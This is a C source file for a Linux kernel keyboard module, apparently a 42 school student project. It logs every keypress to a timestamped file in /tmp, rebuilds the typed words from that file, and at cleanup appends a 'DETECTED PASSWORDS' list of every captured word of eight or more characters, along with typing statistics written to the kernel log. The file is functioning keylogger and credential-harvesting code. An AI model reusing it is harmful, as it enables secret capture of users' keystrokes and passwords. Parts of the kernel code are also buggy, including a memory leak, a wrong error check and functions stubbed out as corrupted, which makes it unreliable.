/******************************************************************************/
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   tmpfile.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: daribeir <daribeir@student.42mulhouse.fr>  +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/04/28 01:20:17 by daribeir          #+#    #+#             */
/*   Updated: 2025/11/16 03:38:15 by daribeir         ###   ##### Mulhouse.fr */
/*                                                                            */
/******************************************************************************/


#include "42kb.h"
#include <linux/fs.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/spinlock.h>

extern spinlock_t devfile_io_spinlock;

// Global stats structure to share between ft_log_stats_to_kernel and ft_log_tmpfile_with_stats
typedef struct {
	int total_events;
	int total_pressed;
	int total_alpha;
	int duration_ms;
	int speed_eps;
	time64_t first_time;
	time64_t last_time;
	int top_keys[5];
	int top_counts[5];
	int avg_per_key;
} keyboard_stats_t;

static keyboard_stats_t g_stats = {0};

struct file* tmpfile = 0;
loff_t tmpoffset = 0;

/**
 * word_extract - Structure pour stocker un mot capturé
 *
 * buffer - le mot (chaîne de caractères)
 * length - nombre de caractères
 * first_time - timestamp de la première touche
 * last_time - timestamp de la dernière touche
 * duration - durée totale en ms
*/
typedef struct {
	char buffer[256];
	int length;
	time64_t first_time;
	time64_t last_time;
	int duration_ms;
} word_extract_t;

static int ft_write_tmpfile(char *str, int len)
{
	const struct file_operations	*f_op = tmpfile->f_op;

	if (!f_op)
	{
		ft_warn("No fop on tmpfile\n");
		return 1;
	}

	return kernel_write(tmpfile, str, len, &tmpoffset);
}

int ft_create_tmpfile(void)
{
	char *time;
	char *filename;
	char *prefix;

	time = ft_itoa(ktime_get_seconds());
	filename = kmalloc(69, GFP_KERNEL);
	prefix = kmalloc(69, GFP_KERNEL);
	strcpy(prefix, "/tmp/42kb");
	filename = strcat(prefix, time);
	tmpfile = filp_open(filename, O_WRONLY | O_CREAT, S_IRWXU);
	kfree(filename);
	kfree(time);
	if (tmpfile) {
		printk("Created tmpfile %s\n", tmpfile->f_path.dentry->d_name.name);
		return 0;
	}
	else
	{
		ft_warn("Cannot create tmpfile");
		return 1;
	}
}

/**
 * ft_log_event_to_tmpfile - Log un événement en temps réel dans le fichier /tmp
 * @event: L'événement à logger
 */
void ft_log_event_to_tmpfile(event_struct *event)
{
	char *event_line;

	if (!event || !tmpfile)
		return;

	event_line = event_to_str(*event);
	if (event_line) {
		ft_write_tmpfile(event_line, strlen(event_line));
		kfree(event_line);
	}
}

/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
 * Raison: entry->ascii_value est décalé/corrompu en mémoire
 * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
 */
int ft_extract_words_from_keylog(void)
{
	return 0;
}

/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
 * Raison: entry->ascii_value est décalé/corrompu en mémoire, produit "cceeccii" au lieu de "ceci"
 * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
 */
void ft_extract_words_to_kernel_log(void)
{
	return;
}

/* FONCTION DÉSACTIVÉE - NE PAS UTILISER
 * Raison: entry->ascii_value est décalé/corrompu en mémoire
 * Utiliser ft_parse_tmpfile_for_words() qui lit depuis le fichier au lieu de la mémoire
 */
void ft_detect_passwords(void)
{
	return;
}

/**
 * ft_parse_tmpfile_for_words - Parse tmpfile and extract words
 * Format: "HH:MM:SS name(code) Pressed"
 * Extract the NAME and split on "space" and "return"
 *
 * CORRECTION: Chaque mot DOIT avoir son propre buffer séparé, pas un buffer partagé
 */
static word_extract_t* ft_parse_tmpfile_for_words(int *word_count, char *tmpfile_path)
{
	struct file *read_file;
	char *buffer;
	char *line;
	loff_t file_offset = 0;
	int bytes_read;
	word_extract_t *words;
	int i, line_len;
	char *line_start;
	char *space_pos;
	char *paren_open;
	char name_str[256];
	int current_word_len = 0;
	int min_word_len = 3;
	int name_len;

	// Allocate
	buffer = kmalloc(8192, GFP_KERNEL);
	line = kmalloc(512, GFP_KERNEL);
	words = kmalloc(sizeof(word_extract_t) * 100, GFP_KERNEL);

	if (!buffer || !line || !words) {
		ft_warn("Memory allocation failed");
		kfree(buffer);
		kfree(line);
		kfree(words);
		*word_count = 0;
		return NULL;
	}

	// Initialize - IMPORTANT: chaque mot DOIT avoir son propre buffer SÉPARÉ
	for (i = 0; i < 100; i++) {
		words[i].length = 0;
		memset(words[i].buffer, 0, 256);  // NETTOYER LE BUFFER
	}
	*word_count = 0;
	current_word_len = 0;

	// Open tmpfile in read mode
	read_file = filp_open(tmpfile_path, O_RDONLY, 0);
	if (IS_ERR(read_file)) {
		ft_warn("Cannot open tmpfile for reading");
		kfree(buffer);
		kfree(line);
		kfree(words);
		return NULL;
	}

	// Read file in chunks
	while ((bytes_read = kernel_read(read_file, buffer, 8192, &file_offset)) > 0) {
		line_start = buffer;

		for (i = 0; i < bytes_read; i++) {
			if (buffer[i] == '\n' || i == bytes_read - 1) {
				// Extract line - IMPORTANT: calculer la longueur relative à line_start
				int line_start_offset = line_start - buffer;
				line_len = (buffer[i] == '\n') ? (i - line_start_offset) : (i - line_start_offset + 1);

				if (line_len > 0 && line_len < 512) {
					memcpy(line, line_start, line_len);
					line[line_len] = '\0';

					// Check if Pressed
					if (strstr(line, "Pressed")) {
						// Format: "HH:MM:SS name(code) Pressed"
						// Find the space between time and name
						space_pos = strchr(line, ' ');
						if (space_pos) {
							// Find opening parenthesis
							paren_open = strchr(space_pos, '(');

							if (paren_open) {
								// Extract name (between space and paren)
								name_len = paren_open - space_pos - 1;
								if (name_len > 0 && name_len < 256) {
									memcpy(name_str, space_pos + 1, name_len);
									name_str[name_len] = '\0';

									// Delimiters: "space" or "return"
									if (strcmp(name_str, "space") == 0 || strcmp(name_str, "return") == 0) {
										// End of word - SAVE current word before resetting
										if (current_word_len >= min_word_len && *word_count < 100) {
											// Finaliser le mot courant: null-terminate
											words[*word_count].buffer[current_word_len] = '\0';
											words[*word_count].length = current_word_len;
											(*word_count)++;
										}
										current_word_len = 0;
									} else if (strlen(name_str) == 1 && ((name_str[0] >= 'a' && name_str[0] <= 'z') || (name_str[0] >= 'A' && name_str[0] <= 'Z'))) {
										// Single letter - add to current word
										char c = name_str[0];

										// CRUCIAL: Si c'est le premier caractère du mot, nettoyer le buffer d'abord
										if (current_word_len == 0) {
											memset(words[*word_count].buffer, 0, 256);
										}

										if (current_word_len < 255 && *word_count < 100) {
											words[*word_count].buffer[current_word_len] = c;
											current_word_len++;
										}
									}
								}
							}
						}
					}
				}
				line_start = &buffer[i + 1];
			}
		}
	}

	// Save last word
	if (current_word_len >= min_word_len && *word_count < 100) {
		words[*word_count].buffer[current_word_len] = '\0';
		words[*word_count].length = current_word_len;
		(*word_count)++;
	}

	filp_close(read_file, NULL);
	kfree(buffer);
	kfree(line);

	return words;
}

/**
 * ft_log_tmpfile_with_stats - Write stats and word detection to /tmp at cleanup
 * Closes, rereads file, parses words from NAME fields, appends to file
 * Only uses file-based parsing, not in-memory which is corrupted
 */
void ft_log_tmpfile_with_stats(void)
{
	char *stats_str;
	char tmpfile_path[128];
	char line[512];
	word_extract_t *words;
	int word_count;
	int i;
	int password_count = 0;

	stats_str = kmalloc(512, GFP_KERNEL);
	if (!stats_str) {
		ft_warn("Memory allocation failed for stats");
		return;
	}

	// Get the tmpfile path before closing
	memset(tmpfile_path, 0, 128);
	if (tmpfile && tmpfile->f_path.dentry) {
		snprintf(tmpfile_path, 128, "/tmp/%s",
			tmpfile->f_path.dentry->d_name.name);
	}

	// Close the write-mode tmpfile
	if (tmpfile) {
		filp_close(tmpfile, NULL);
		tmpfile = NULL;
	}

	// Parse words from file using NAME fields (ONLY method that works correctly)
	words = ft_parse_tmpfile_for_words(&word_count, tmpfile_path);

	// Reopen tmpfile in APPEND mode to add stats
	tmpfile = filp_open(tmpfile_path, O_WRONLY | O_APPEND, S_IRWXU);
	if (!tmpfile || IS_ERR(tmpfile)) {
		ft_warn("Cannot reopen tmpfile in append mode");
		kfree(stats_str);
		if (words)
			kfree(words);
		return;
	}
	tmpoffset = 0;
	vfs_llseek(tmpfile, 0, SEEK_END);

	// Write summary section
	snprintf(stats_str, 512,
		"\n\n=== KEYBOARD SUMMARY ===\n"
		"Session cleanup - analysis of captured input\n"
		"===========================\n\n");
	ft_write_tmpfile(stats_str, strlen(stats_str));

	// Write detected words from file parsing
	if (word_count > 0) {
		snprintf(line, 512, "=== DETECTED WORDS (Min 3 chars) ===\n");
		ft_write_tmpfile(line, strlen(line));

		for (i = 0; i < word_count; i++) {
			snprintf(line, 512, "  %d. \"%s\" (%d chars)\n",
				i + 1,
				words[i].buffer,
				words[i].length);
			ft_write_tmpfile(line, strlen(line));

			// Count passwords (8+ chars)
			if (words[i].length >= 8) {
				password_count++;
			}
		}
		snprintf(line, 512, "Total Words: %d\n", word_count);
		ft_write_tmpfile(line, strlen(line));

		// Write passwords if any detected
		if (password_count > 0) {
			snprintf(line, 512, "\n=== DETECTED PASSWORDS (8+ chars) ===\n");
			ft_write_tmpfile(line, strlen(line));

			for (i = 0; i < word_count; i++) {
				if (words[i].length >= 8) {
					snprintf(line, 512, "  - \"%s\" (%d chars)\n",
						words[i].buffer,
						words[i].length);
					ft_write_tmpfile(line, strlen(line));
				}
			}
			snprintf(line, 512, "Total Passwords: %d\n", password_count);
			ft_write_tmpfile(line, strlen(line));
		} else {
			ft_write_tmpfile("\nNo passwords detected (min 8 chars required)\n", 45);
		}
	} else {
		ft_write_tmpfile("No words detected\n", 18);
	}

	kfree(stats_str);
	if (words)
		kfree(words);

	if (tmpfile) {
		filp_close(tmpfile, NULL);
		tmpfile = NULL;
	}
}

void ft_log_tmpfile(void)
{
	char *temp_str;
	struct list_head *head_ptr;
	struct event_struct *entry;
	int total_inputs;

	head_ptr = g_driver->events_head->list.next;
	temp_str = kmalloc(69, GFP_KERNEL);
	total_inputs = 0;
	while (head_ptr != &(g_driver->events_head->list))
	{
		entry = list_entry(head_ptr, struct event_struct, list);

		if (entry->is_pressed)
		{
			if (entry->ascii_value > 0)
			{
				++total_inputs;
				ft_write_tmpfile(&(entry->ascii_value), 1);
			}
		}

		head_ptr = head_ptr->next;
	}
	sprintf(temp_str, "\n\nTotal keystrokes: %d\n", total_inputs);
	ft_write_tmpfile(temp_str, strlen(temp_str));
	kfree(temp_str);
}

/**
 * ft_log_stats_to_kernel - Advanced keyboard stats to kernel log
 *
 * Affiche des statistiques détaillées:
 * - Total d'événements et touches alphanumériques
 * - Top 5 touches les plus pressées
 * - Durée min/max/avg par touche
 * - Vitesse de frappe
 * - Première et dernière touche
 */
void ft_log_stats_to_kernel(void)
{
	struct list_head *head_ptr;
	struct event_struct *entry;
	int total_events = 0;
	int total_alpha = 0;
	int total_pressed = 0;
	int *key_counts;
	int *key_durations;
	int i, j;
	int max_count, max_key;
	time64_t first_time = 0, last_time = 0;
	int duration_ms = 0;

	// Allouer dynamiquement les tableaux pour éviter stack overflow
	key_counts = kmalloc(256 * sizeof(int), GFP_KERNEL);
	key_durations = kmalloc(256 * sizeof(int), GFP_KERNEL);
	if (!key_counts || !key_durations) {
		ft_warn("Memory allocation failed for stats");
		kfree(key_counts);
		kfree(key_durations);
		return;
	}

	// Initialiser compteurs
	for (i = 0; i < 256; i++) {
		key_counts[i] = 0;
		key_durations[i] = 0;
	}

	// Compter les événements et calculer durées
	spin_lock(&devfile_io_spinlock);
	head_ptr = g_driver->events_head->list.next;
	while (head_ptr != &(g_driver->events_head->list)) {
		entry = list_entry(head_ptr, struct event_struct, list);
		total_events++;

		// Tracker temps première et dernière touche
		if (first_time == 0)
			first_time = entry->time;
		last_time = entry->time;

		// Compter touches alphanumériques pressées
		if (entry->is_pressed) {
			total_pressed++;
			if (entry->ascii_value > 32 && entry->ascii_value < 127)
				total_alpha++;
		}

		// Compter par keycode
		if (entry->scan_code < 256) {
			key_counts[entry->scan_code]++;
			// Durée approximative (Press + Release = 2 events)
			if (entry->is_pressed)
				key_durations[entry->scan_code]++;
		}

		head_ptr = head_ptr->next;
	}
	spin_unlock(&devfile_io_spinlock);

	// Calculer durée totale
	duration_ms = (last_time - first_time) * 1000;
	if (duration_ms < 0)
		duration_ms = 0;

	// SAVE stats globalement pour utilisation dans ft_log_tmpfile_with_stats
	g_stats.total_events = total_events;
	g_stats.total_pressed = total_pressed;
	g_stats.total_alpha = total_alpha;
	g_stats.duration_ms = duration_ms;
	g_stats.first_time = first_time;
	g_stats.last_time = last_time;
	if (duration_ms > 0) {
		g_stats.speed_eps = (total_events * 1000) / (duration_ms + 1);
	}
	if (total_alpha > 0) {
		g_stats.avg_per_key = (total_events * 100) / (total_alpha + 1);
	}

	// ===== AFFICHAGE STATS =====
	printk(KERN_INFO "[42-KB] ===== KEYBOARD STATS =====\n");
	printk(KERN_INFO "[42-KB] Total Events: %d\n", total_events);
	printk(KERN_INFO "[42-KB] Pressed Keys: %d | Alphanumeric: %d\n",
		total_pressed, total_alpha);

	if (duration_ms > 0) {
		printk(KERN_INFO "[42-KB] Duration: %d ms | Speed: %d events/sec\n",
			duration_ms, (total_events * 1000) / (duration_ms + 1));
	}

	// === TOP 5 TOUCHES ===
	printk(KERN_INFO "[42-KB] === Top 5 Keys ===\n");
	for (i = 0; i < 5; i++) {
		max_count = 0;
		max_key = -1;

		for (j = 0; j < 256; j++) {
			if (key_counts[j] > max_count) {
				max_count = key_counts[j];
				max_key = j;
			}
		}

		if (max_key >= 0 && max_count > 0) {
			int hold_time = key_durations[max_key];
			printk(KERN_INFO "[42-KB] #%d: Key(%3d) - %d presses, %dms held\n",
				i + 1, max_key, max_count, hold_time);
			key_counts[max_key] = 0; // Mark as counted
		}
	}

	if (total_alpha > 0) {
		int avg_per_key = (total_events * 100) / (total_alpha + 1);
		printk(KERN_INFO "[42-KB] Avg: %d.%d events/key\n",
			avg_per_key / 100, avg_per_key % 100);
	}

	// === STATISTIQUES FINALES ===
	printk(KERN_INFO "[42-KB] Session: %ld - %ld (%ld sec)\n",
		first_time, last_time, last_time - first_time);
	printk(KERN_INFO "[42-KB] ===== END STATS =====\n");

	// === DÉTECTION DES MOTS ===
	ft_extract_words_to_kernel_log();

	// === DÉTECTION DES PASSWORDS ===
	ft_detect_passwords();

	// Libérer la mémoire allouée
	kfree(key_counts);
	kfree(key_durations);
}